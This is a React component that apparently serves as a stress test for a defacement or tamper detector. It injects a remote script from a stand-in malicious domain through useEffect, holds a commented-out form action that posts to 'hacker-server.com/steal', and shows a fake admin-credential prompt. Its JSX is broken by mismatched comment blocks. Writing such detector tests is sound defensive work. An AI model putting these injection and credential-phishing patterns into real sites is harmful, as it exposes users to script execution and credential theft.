import React, { useEffect } from 'react';

/**
 * MainContent - Layer 1 Full Stress Test
 * 
 * Logic being tested:
 * 1. Script Injection (via useEffect) -> script_injection_new_domain
 * 2. Structural Drift (h5 instead of h1) -> raw_score change
 * 3. Form Hijacking (action change) -> form_action_change_payment
 */

const MainContent = () => {
  
  // Method to bypass React's script protection and force it into the DOM
  useEffect(() => {
    const script = document.createElement("script");
    script.src = "https://unknown-cdn.com/malicious.js";
    script.id = "malicious-script-trigger";
    document.body.appendChild(script);
    
    // Cleanup when component unmounts
    return () => {
      const el = document.getElementById("malicious-script-trigger");
      if (el) document.body.removeChild(el);
    };
  }, []);

  return (
    <div className="defaced-root" id="layer1-pwned-zone">

      <header
        className="hacked-header"
        style={{
          backgroundColor: '#111',
          color: '#ff4444',
          padding: '50px',
          textAlign: 'center',
        }}
      >
        {/* TEST 1: Change h1 to h5 (Structural Drift) */}
        {/* <h5 style={{ fontSize: '3rem', marginBottom: '10px' }}>
          PLATFORM MAINTENANCE ACTIVE
        </h5>

        <h2 style={{ fontWeight: 'normal' }}>
          Hacker
        </h2>
      </header>

      <main className="content-purge" style={{ padding: '30px' }}>

        <p>
          This platform is currently undergoing infrastructure upgrades
          and authentication system maintenance.
        </p> */}

        {/* TEST 2: Form Action Hijacking */}
        {/* Note: Ensure page_type is set to 'payment' in your DB to trigger this! */}
        {/* <form 
          action="https://hacker-server.com/steal" 
          method="POST"
          style={{
            margin: '40px 0',
            border: '2px solid #ff4444',
            padding: '20px',
            borderRadius: '6px',
          }}
        > */}
          <h3>Administrator Access Validation</h3>

          <label
            htmlFor="adminKey"
            style={{ display: 'block', marginBottom: '10px' }}
          >
            Secure Verification Credential
          </label>

          <input
            id="adminKey"
            type="password"
            placeholder="Enter authorized verification credential"
            style={{
              padding: '12px',
              width: '100%',
              marginBottom: '20px',
            }}
          />

          <button
            type="submit"
            style={{
              backgroundColor: '#ff4444',
              color: 'white',
              border: 'none',
              padding: '12px 24px',
              cursor: 'pointer',
            }}
          >
            Validate Administrative Session
          </button>
        </form>
      </main>

      {/* Structural filler */}
      <div
        className="structural-noise"
        aria-hidden="true"
        style={{ opacity: 0, height: 0 }}
      >
        {Array.from({ length: 400 }).map((_, i) => (
          <section key={i} className={`anomaly-block-v4-${i}`}>
            <span id={`drift-id-${i}`}>
              STRUCTURAL_ENTROPY_ACTIVE
            </span>
          </section>
        ))}
      </div>

      <footer
        className="footer-void"
        style={{
          textAlign: 'center',
          padding: '20px',
          borderTop: '4px solid #ff4444',
        }}
      >
        <b style={{ fontSize: '20px' }}>
          SYSTEM STATUS: MAINTENANCE MODE
        </b>
      </footer>
    </div>
  );
};

export default MainContent;
